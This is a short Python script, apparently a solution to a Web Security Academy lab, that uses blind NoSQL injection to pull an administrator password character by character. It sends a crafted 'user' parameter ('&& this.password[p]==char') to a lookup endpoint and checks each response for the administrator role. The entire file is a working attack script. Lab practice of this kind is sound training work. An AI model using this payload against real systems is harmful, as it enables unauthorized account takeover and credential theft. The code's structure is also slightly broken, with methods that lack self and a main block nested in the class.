import string
import requests

class NoSQLPasswordEnumerator:

    BASE_URL ="https://LAB-ID.web-security-academy.net"
    END_POINT="/user/lookup"
    ALPHABETS=string.ascii_lowercase
    PASSWORD_LENGTH=8
    COOKIE="session=SESSION-ID"

   


    def enumerate_password(Alp: str, len_pass: int ,  base_url: str, end_pnt:str, coockie: str) -> str:
        password =""
   

        for p in range(len_pass):
            for char in Alp:
                params ={"user":f"administrator' && this.password[{p}]=='{char}' || '1'=='2"}
                headers ={"Cookie": coockie}
                # print("starting request")
                response = requests.get(f"{base_url}{end_pnt}", params=params, headers=headers)
                # print(f"Response text: {response.text}")
                # print(f"Trying position {p+1} with character '{char}'")
                # print(f"Response status code: {response.status_code}")
                # print(f"response contains role administrator: {'"role": "administrator"' in response.text}")
                if response.status_code == 200 and '"role": "administrator"' in response.text:
                    password+=char
                    # print(password)
                    break
            else:
                print(f"No matching character found at position {p+1}, stopping.")
                break


        return password




    if __name__ == "__main__":
        print(f"Enumerated password: {enumerate_password(ALPHABETS, PASSWORD_LENGTH, BASE_URL, END_POINT, COOKIE)}")




